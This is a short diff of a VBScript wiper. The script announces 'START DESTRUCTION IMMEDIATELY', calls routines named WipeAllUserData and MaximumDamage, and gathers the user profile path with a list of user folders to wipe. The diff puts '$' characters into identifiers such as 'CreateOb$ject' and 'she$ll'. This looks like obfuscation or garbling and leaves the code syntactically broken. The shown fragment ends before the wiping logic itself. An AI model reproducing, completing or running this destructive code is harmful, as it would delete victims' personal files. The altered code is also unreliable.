@@ -1,5 +1,5 @@
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set shell = CreateObject("WScript.Shell")
+Set fso = CreateOb$ject("Scripting.FileSystemObject")
+Set she$ll = CreateObject("WScript.Shell")
 
 ' START DESTRUCTION IMMEDIATELY
 WipeAllUserData
@@ -9,7 +9,7 @@ MaximumDamage
 
 Sub WipeAllUserData()
     On Error Resume Next
-    userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
+    userProfile = she$ll.ExpandEnvironmentStrings("%USERPROFILE%")
     
     ' List of user folders to wipe
     userFolders = Array( _
